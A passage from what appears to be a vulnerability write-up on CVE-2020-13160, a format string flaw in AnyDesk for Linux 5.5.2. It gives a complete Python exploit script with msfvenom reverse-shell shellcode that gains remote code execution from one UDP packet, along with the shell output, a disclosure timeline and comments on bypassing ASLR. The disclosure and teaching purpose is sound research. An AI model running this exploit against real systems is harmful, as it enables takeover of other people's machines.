
<p>Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another <code>18</code> characters of padding (<code>%18x</code>) and a dummy shellcode (<code>0xcc</code>):</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; gutter: false; title: ; notranslate" title="">
shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
</pre></div>


<p>Now the <code>GOT</code> entry is overwritten with the address of the shellcode:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 &lt;time@got.plt&gt;:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3   
</pre></div>


<h2 id="final">Final exploit</h2>



<p>Finally it is time to generate a real payload:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b &quot;\x00\x25\x26&quot; -f python -v shellcode
...

</pre></div>


<p>Please notice the bad bytes. <code>0x00</code> is excluded to prevent the string from being terminated. <code>0x25</code> (<code>%</code>) would introduce another format specifier and <code>0x26</code> (<code>&amp;</code>) is used by glib and must also be avoided.</p>



<p>The final exploit script looks like this:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate" title="">
#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('&gt;I', ad_id)
  d += struct.pack('&gt;I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('&gt;I', len(hn)) + hn
  d += struct.pack('&gt;I', len(user)) + user
  d += struct.pack('&gt;I', 0)
  d += struct.pack('&gt;I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('&gt;I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d


shellcode =  b&quot;&quot;
shellcode += b&quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48&quot;
shellcode += b&quot;\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6&quot;
shellcode += b&quot;\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d&quot;
shellcode += b&quot;\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35&quot;
shellcode += b&quot;\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81&quot;
shellcode += b&quot;\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f&quot;
shellcode += b&quot;\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd&quot;
shellcode += b&quot;\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf&quot;
shellcode += b&quot;\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3&quot;
shellcode += b&quot;\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8&quot;
shellcode += b&quot;\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38&quot;

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
</pre></div>


<p>Before running the exploit we start a <code>nc</code> listener on port 4444:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ nc -lvp 4444
Listening on &#91;0.0.0.0] (family 0, port 4444)
</pre></div>


<p>Now we run the exploit script:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
user@w00d:~$ ./final_exploit.py 
sending payload ...
reverse shell should connect within 5 seconds
</pre></div>


<p>After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; gutter: false; title: ; notranslate" title="">
...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
</pre></div>


<h1 id="conclusion">Conclusion</h1>



<p>By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the <code>GOT</code> entry of the <code>time</code> function to the stack and a second time to write the heap address of our shellcode to the <code>GOT</code> entry using a <code>dynamic field width</code>.</p>



<p>Please keep in mind that this is a proof of concept exploit targeting AnyDesk Linux version <code>5.5.2</code>. The exploit was developed for <code>Ubuntu 18.04.4 LTS</code> at the time of writing. In order to successfully run the exploit against other targets it probably needs to be adjusted.</p>



<p>At last I would like to thank AnyDesk for the immediate and professional reaction. A patch to fix the vulnerability was released only three days after my notification. Also the patch enabled <code>FULL RELRO</code> according to my suggestion. This remaps the <code>GOT</code> as read-only preventing an attacker from overwriting an entry within the <code>GOT</code>.</p>



<p>It is great to see when security is taken seriously.</p>



<p>Thanks for reading the article 🙂</p>



<p><strong>Timeline</strong><br>18/02/20 &#8211; Vendor Notification<br>19/02/20 &#8211; Vendor Acknowledgement<br>21/02/20 &#8211; Vendor Patch<br>09/06/20 &#8211; Public Disclosure</p>



<p></p>
<div class="post-views post-1881 entry-meta">
				<span class="post-views-icon dashicons dashicons-chart-bar"></span>
				<span class="post-views-label">Post Views:</span>
				<span class="post-views-count">18,087</span>
			</div>	</div><!-- .entry-content -->

	<footer class="entry-footer"><span class="cat-tags-links"><span class="cat-links"><svg class="icon icon-folder-open" aria-hidden="true" role="img"> <use href="#icon-folder-open" xlink:href="#icon-folder-open"></use> </svg><span class="screen-reader-text">Categories</span><a href="https://devel0pment.de/?cat=29" rel="category">article</a></span><span class="tags-links"><svg class="icon icon-hashtag" aria-hidden="true" role="img"> <use href="#icon-hashtag" xlink:href="#icon-hashtag"></use> </svg><span class="screen-reader-text">Tags</span><a href="https://devel0pment.de/?tag=cve-2020-13160" rel="tag">CVE-2020-13160</a>, <a href="https://devel0pment.de/?tag=exploitation" rel="tag">exploitation</a>, <a href="https://devel0pment.de/?tag=formatstring" rel="tag">formatstring</a>, <a href="https://devel0pment.de/?tag=fuzzing" rel="tag">fuzzing</a>, <a href="https://devel0pment.de/?tag=rce" rel="tag">rce</a></span></span></footer> <!-- .entry-footer -->
</article><!-- #post-1881 -->

<div id="comments" class="comments-area">

			<h2 class="comments-title">
			6 Replies to &ldquo;AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)&rdquo;		</h2>

		<ol class="comment-list">
					<li id="comment-2625" class="comment even thread-even depth-1 parent">
			<article id="div-comment-2625" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=100&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e82a050707aeed85933f04f71f9971fd?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' loading='lazy'/>						<b class="fn">Ali</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://devel0pment.de/?p=1881#comment-2625"><time datetime="2020-11-24T16:31:09+00:00">24. November 2020 at 4:31 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Do you by any chance know where I can find a document that details AnyDesk file format</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://devel0pment.de/?p=1881&#038;replytocom=2625#respond' data-commentid="2625" data-postid="1881" data-belowelement="div-comment-2625" data-respondelement="respond" data-replyto="Reply to Ali" aria-label='Reply to Ali'><svg class="icon icon-mail-reply" aria-hidden="true" role="img"> <use href="#icon-mail-reply" xlink:href="#icon-mail-reply"></use> </svg>Reply</a></div>			</article><!-- .comment-body -->
		<ol class="children">
		<li id="comment-2626" class="comment byuser comment-author-scryh bypostauthor odd alt depth-2">
			<article id="div-comment-2626" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' loading='lazy'/>						<b class="fn">scryh</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://devel0pment.de/?p=1881#comment-2626"><time datetime="2020-11-24T16:56:02+00:00">24. November 2020 at 4:56 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>No, sorry. I am not aware of any documentation. Probably there isn&#8217;t any publicly available.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://devel0pment.de/?p=1881&#038;replytocom=2626#respond' data-commentid="2626" data-postid="1881" data-belowelement="div-comment-2626" data-respondelement="respond" data-replyto="Reply to scryh" aria-label='Reply to scryh'><svg class="icon icon-mail-reply" aria-hidden="true" role="img"> <use href="#icon-mail-reply" xlink:href="#icon-mail-reply"></use> </svg>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-2645" class="comment even thread-odd thread-alt depth-1 parent">
			<article id="div-comment-2645" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=100&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f2dbf914b04cd46b9b19fe0f11837221?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' loading='lazy'/>						<b class="fn">hans</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://devel0pment.de/?p=1881#comment-2645"><time datetime="2020-12-11T17:23:43+00:00">11. December 2020 at 5:23 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>the most difficult part is search 2 stack that reliable for format string argument &#8230;<br />
but what if the heap doesnt mark with rwx instead the stack that got mark rwx ?</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://devel0pment.de/?p=1881&#038;replytocom=2645#respond' data-commentid="2645" data-postid="1881" data-belowelement="div-comment-2645" data-respondelement="respond" data-replyto="Reply to hans" aria-label='Reply to hans'><svg class="icon icon-mail-reply" aria-hidden="true" role="img"> <use href="#icon-mail-reply" xlink:href="#icon-mail-reply"></use> </svg>Reply</a></div>			</article><!-- .comment-body -->
		<ol class="children">
		<li id="comment-2647" class="comment byuser comment-author-scryh bypostauthor odd alt depth-2">
			<article id="div-comment-2647" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' loading='lazy'/>						<b class="fn">scryh</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://devel0pment.de/?p=1881#comment-2647"><time datetime="2020-12-12T17:32:16+00:00">12. December 2020 at 5:32 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Yes, in this case the stack varies when the format string vulnerability is triggered either by the username or by the hostname. You can increase the reliability by simply using values more down on the stack, as these values are more likely to stay the same between both calls.<br />
If the heap is not marked as rwx you cannot use the strategy described here. The main challenge was to defeat ASLR with a single shot (no leak). The dynamic field width is one way to do this, but it probably won&#8217;t be possible with the stack, since stack addresses exceed 4 bytes and the dynamic field width only uses 4 bytes. Another approach would be a partial overwrite (only overwriting the least significant bytes of a function pointer / return address leaving the upper bytes as influenced by ASLR) in order to set the instruction pointer to a controlled memory address marked as rwx. If this does not seem to be possible too, another strategy might be to actually leak an address e.g. by determining a way to transmit an address via an UDP broadcast. Also keep in mind that PIE is not enabled for the binary, which means that the addresses of the binary itself are not influenced by ASLR. Although a format string vulnerability is not as comfortable as a classical buffer overflow in order to store a ROP chain, it is possible. You could store the ROP chain at a known address (from the binary) by multiply leveraging the format string vulnerability and then finally overwrite an GOT entry with the address of an gadget setting the stack pointer to this specific address.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://devel0pment.de/?p=1881&#038;replytocom=2647#respond' data-commentid="2647" data-postid="1881" data-belowelement="div-comment-2647" data-respondelement="respond" data-replyto="Reply to scryh" aria-label='Reply to scryh'><svg class="icon icon-mail-reply" aria-hidden="true" role="img"> <use href="#icon-mail-reply" xlink:href="#icon-mail-reply"></use> </svg>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-2935" class="comment even thread-even depth-1 parent">
			<article id="div-comment-2935" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=100&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b576ed7219c952b200df2dbea3d1349f?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' loading='lazy'/>						<b class="fn">gmcyber</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://devel0pment.de/?p=1881#comment-2935"><time datetime="2021-03-25T17:25:54+00:00">25. March 2021 at 5:25 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>What a nice piece of analysis. I&#8217;ve added this as a CTF target in one of my courses.  The exploit seems rock solid on 18.04.4.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://devel0pment.de/?p=1881&#038;replytocom=2935#respond' data-commentid="2935" data-postid="1881" data-belowelement="div-comment-2935" data-respondelement="respond" data-replyto="Reply to gmcyber" aria-label='Reply to gmcyber'><svg class="icon icon-mail-reply" aria-hidden="true" role="img"> <use href="#icon-mail-reply" xlink:href="#icon-mail-reply"></use> </svg>Reply</a></div>			</article><!-- .comment-body -->
		<ol class="children">
		<li id="comment-2936" class="comment byuser comment-author-scryh bypostauthor odd alt depth-2">
			<article id="div-comment-2936" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' loading='lazy'/>						<b class="fn">scryh</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://devel0pment.de/?p=1881#comment-2936"><time datetime="2021-03-25T17:41:33+00:00">25. March 2021 at 5:41 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Thanks 🙂</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://devel0pment.de/?p=1881&#038;replytocom=2936#respond' data-commentid="2936" data-postid="1881" data-belowelement="div-comment-2936" data-respondelement="respond" data-replyto="Reply to scryh" aria-label='Reply to scryh'><svg class="icon icon-mail-reply" aria-hidden="true" role="img"> <use href="#icon-mail-reply" xlink:href="#icon-mail-reply"></use> </svg>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		</ol>

			<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/?p=1881#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://devel0pment.de/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='1881' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://devel0pment.de/?p=1593" rel="prev"><span class="screen-reader-text">Previous Post</span><span aria-hidden="true" class="nav-subtitle">Previous</span> <span class="nav-title"><span class="nav-title-icon-wrapper"><svg class="icon icon-arrow-left" aria-hidden="true" role="img"> <use href="#icon-arrow-left" xlink:href="#icon-arrow-left"></use> </svg></span>Hack The Box &#8211; Rope</span></a></div><div class="nav-next"><a href="https://devel0pment.de/?p=2027" rel="next"><span class="screen-reader-text">Next Post</span><span aria-hidden="true" class="nav-subtitle">Next</span> <span class="nav-title">ALLES! CTF 2020 &#8211; Actual ASLR 1/2<span class="nav-title-icon-wrapper"><svg class="icon icon-arrow-right" aria-hidden="true" role="img"> <use href="#icon-arrow-right" xlink:href="#icon-arrow-right"></use> </svg></span></span></a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->
	
<aside id="secondary" class="widget-area" role="complementary" aria-label="Blog Sidebar">
	<section id="search-2" class="widget widget_search">

<form role="search" method="get" class="search-form" action="https://devel0pment.de/">
	<label for="search-form-1">
		<span class="screen-reader-text">Search for:</span>
	</label>
	<input type="search" id="search-form-1" class="search-field" placeholder="Search &hellip;" value="" name="s" />
	<button type="submit" class="search-submit"><svg class="icon icon-search" aria-hidden="true" role="img"> <use href="#icon-search" xlink:href="#icon-search"></use> </svg><span class="screen-reader-text">Search</span></button>
</form>
</section><section id="pages-2" class="widget widget_pages"><h2 class="widget-title">Pages</h2><nav role="navigation" aria-label="Pages">
			<ul>
				<li class="page_item page-item-2"><a href="https://devel0pment.de/?page_id=2">Impressum / Contact</a></li>
			</ul>

			</nav></section>
		<section id="recent-posts-2" class="widget widget_recent_entries">
		<h2 class="widget-title">Recent Posts</h2><nav role="navigation" aria-label="Recent Posts">
		<ul>
											<li>
					<a href="https://devel0pment.de/?p=2431">ASIS CTF Quals 2021 &#8211; ASCII art a a service</a>
									</li>
											<li>
					<a href="https://devel0pment.de/?p=2282">Hacky Easter 2021 writeup</a>
									</li>
											<li>
					<a href="https://devel0pment.de/?p=2217">mpv media player &#8211; mf custom protocol vulnerability (CVE-2021-30145)</a>
									</li>
											<li>
					<a href="https://devel0pment.de/?p=2084">HACKvent20 writeup</a>
									</li>
											<li>
					<a href="https://devel0pment.de/?p=2027">ALLES! CTF 2020 &#8211; Actual ASLR 1/2</a>
									</li>
					</ul>

		</nav></section><section id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><nav role="navigation" aria-label="Recent Comments"><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">scryh</span> on <a href="https://devel0pment.de/?p=386#comment-3411">RPISEC/MBE: writeup lab07 (Heap Exploitation)</a></li><li class="recentcomments"><span class="comment-author-link">Tomer</span> on <a href="https://devel0pment.de/?p=386#comment-3408">RPISEC/MBE: writeup lab07 (Heap Exploitation)</a></li><li class="recentcomments"><span class="comment-author-link">scryh</span> on <a href="https://devel0pment.de/?p=435#comment-3402">RPISEC/MBE: writeup lab09 (C++)</a></li><li class="recentcomments"><span class="comment-author-link">smile</span> on <a href="https://devel0pment.de/?p=435#comment-3401">RPISEC/MBE: writeup lab09 (C++)</a></li><li class="recentcomments"><span class="comment-author-link">scryh</span> on <a href="https://devel0pment.de/?p=378#comment-3396">RPISEC/MBE: writeup lab06 (ASLR)</a></li></ul></nav></section><section id="archives-2" class="widget widget_archive"><h2 class="widget-title">Archives</h2><nav role="navigation" aria-label="Archives">
			<ul>
					<li><a href='https://devel0pment.de/?m=202110'>October 2021</a></li>
	<li><a href='https://devel0pment.de/?m=202105'>May 2021</a></li>
	<li><a href='https://devel0pment.de/?m=202104'>April 2021</a></li>
	<li><a href='https://devel0pment.de/?m=202101'>January 2021</a></li>
	<li><a href='https://devel0pment.de/?m=202009'>September 2020</a></li>
	<li><a href='https://devel0pment.de/?m=202006'>June 2020</a></li>
	<li><a href='https://devel0pment.de/?m=202005'>May 2020</a></li>
	<li><a href='https://devel0pment.de/?m=202001'>January 2020</a></li>
	<li><a href='https://devel0pment.de/?m=201907'>July 2019</a></li>
	<li><a href='https://devel0pment.de/?m=201906'>June 2019</a></li>
	<li><a href='https://devel0pment.de/?m=201903'>March 2019</a></li>
	<li><a href='https://devel0pment.de/?m=201902'>February 2019</a></li>
	<li><a href='https://devel0pment.de/?m=201901'>January 2019</a></li>
	<li><a href='https://devel0pment.de/?m=201808'>August 2018</a></li>
	<li><a href='https://devel0pment.de/?m=201807'>July 2018</a></li>
	<li><a href='https://devel0pment.de/?m=201805'>May 2018</a></li>
	<li><a href='https://devel0pment.de/?m=201803'>March 2018</a></li>
	<li><a href='https://devel0pment.de/?m=201802'>February 2018</a></li>
	<li><a href='https://devel0pment.de/?m=201801'>January 2018</a></li>
			</ul>

			</nav></section><section id="categories-2" class="widget widget_categories"><h2 class="widget-title">Categories</h2><nav role="navigation" aria-label="Categories">
			<ul>
					<li class="cat-item cat-item-29"><a href="https://devel0pment.de/?cat=29">article</a>
</li>
	<li class="cat-item cat-item-24"><a href="https://devel0pment.de/?cat=24">ctf</a>
</li>
	<li class="cat-item cat-item-32"><a href="https://devel0pment.de/?cat=32">Hack The Box</a>
</li>
	<li class="cat-item cat-item-25"><a href="https://devel0pment.de/?cat=25">Hacking-Lab.com</a>
</li>
	<li class="cat-item cat-item-26"><a href="https://devel0pment.de/?cat=26">RPISEC/MBE</a>
</li>
	<li class="cat-item cat-item-7"><a href="https://devel0pment.de/?cat=7">writeup</a>
</li>
			</ul>

			</nav></section><section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Meta</h2><nav role="navigation" aria-label="Meta">
		<ul>
						<li><a href="https://devel0pment.de/wp-login.php">Log in</a></li>
			<li><a href="https://devel0pment.de/?feed=rss2">Entries feed</a></li>
			<li><a href="https://devel0pment.de/?feed=comments-rss2">Comments feed</a></li>

			<li><a href="https://wordpress.org/">WordPress.org</a></li>
		</ul>

		</nav></section></aside><!-- #secondary -->
</div><!-- .wrap -->


		</div><!-- #content -->

		<footer id="colophon" class="site-footer" role="contentinfo">
			<div class="wrap">
				
					<nav class="social-navigation" role="navigation" aria-label="Footer Social Links Menu">
						<div class="menu-info-container"><ul id="menu-info" class="social-links-menu"><li id="menu-item-1668" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1668"><a href="https://devel0pment.de/?page_id=2"><span class="screen-reader-text">Impressum / Contact</span><svg class="icon icon-chain" aria-hidden="true" role="img"> <use href="#icon-chain" xlink:href="#icon-chain"></use> </svg></a></li>
</ul></div>					</nav><!-- .social-navigation -->
					<div class="site-info">
		<a href="https://wordpress.org/" class="imprint">
		Proudly powered by WordPress	</a>
</div><!-- .site-info -->
			</div><!-- .wrap -->
		</footer><!-- #colophon -->
	</div><!-- .site-content-contain -->
</div><!-- #page -->
<script src='https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b' id='syntaxhighlighter-core-js'></script>
<script src='https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.9b' id='syntaxhighlighter-brush-bash-js'></script>
<script src='https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPython.js?ver=3.0.9b' id='syntaxhighlighter-brush-python-js'></script>
<script src='https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPlain.js?ver=3.0.9b' id='syntaxhighlighter-brush-plain-js'></script>
<script src='https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCpp.js?ver=3.0.9b' id='syntaxhighlighter-brush-cpp-js'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://devel0pment.de/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script id='twentyseventeen-skip-link-focus-fix-js-extra'>
var twentyseventeenScreenReaderText = {"quote":"<svg class=\"icon icon-quote-right\" aria-hidden=\"true\" role=\"img\"> <use href=\"#icon-quote-right\" xlink:href=\"#icon-quote-right\"><\/use> <\/svg>"};
</script>
<script src='https://devel0pment.de/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=20161114' id='twentyseventeen-skip-link-focus-fix-js'></script>
<script src='https://devel0pment.de/wp-content/themes/twentyseventeen/assets/js/global.js?ver=20190121' id='twentyseventeen-global-js'></script>
<script src='https://devel0pment.de/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2' id='jquery-scrollto-js'></script>
<script src='https://devel0pment.de/wp-includes/js/comment-reply.min.js?ver=5.8.1' id='comment-reply-js'></script>
<script src='https://devel0pment.de/wp-includes/js/wp-embed.min.js?ver=5.8.1' id='wp-embed-js'></script>
<svg style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>
<symbol id="icon-behance" viewBox="0 0 37 32">
<path class="path1" d="M33 6.054h-9.125v2.214h9.125v-2.214zM28.5 13.661q-1.607 0-2.607 0.938t-1.107 2.545h7.286q-0.321-3.482-3.571-3.482zM28.786 24.107q1.125 0 2.179-0.571t1.357-1.554h3.946q-1.786 5.482-7.625 5.482-3.821 0-6.080-2.357t-2.259-6.196q0-3.714 2.33-6.17t6.009-2.455q2.464 0 4.295 1.214t2.732 3.196 0.902 4.429q0 0.304-0.036 0.839h-11.75q0 1.982 1.027 3.063t2.973 1.080zM4.946 23.214h5.286q3.661 0 3.661-2.982 0-3.214-3.554-3.214h-5.393v6.196zM4.946 13.625h5.018q1.393 0 2.205-0.652t0.813-2.027q0-2.571-3.393-2.571h-4.643v5.25zM0 4.536h10.607q1.554 0 2.768 0.25t2.259 0.848 1.607 1.723 0.563 2.75q0 3.232-3.071 4.696 2.036 0.571 3.071 2.054t1.036 3.643q0 1.339-0.438 2.438t-1.179 1.848-1.759 1.268-2.161 0.75-2.393 0.232h-10.911v-22.5z"></path>
</symbol>
<symbol id="icon-deviantart" viewBox="0 0 18 32">
<path class="path1" d="M18.286 5.411l-5.411 10.393 0.429 0.554h4.982v7.411h-9.054l-0.786 0.536-2.536 4.875-0.536 0.536h-5.375v-5.411l5.411-10.411-0.429-0.536h-4.982v-7.411h9.054l0.786-0.536 2.536-4.875 0.536-0.536h5.375v5.411z"></path>
</symbol>
<symbol id="icon-medium" viewBox="0 0 32 32">
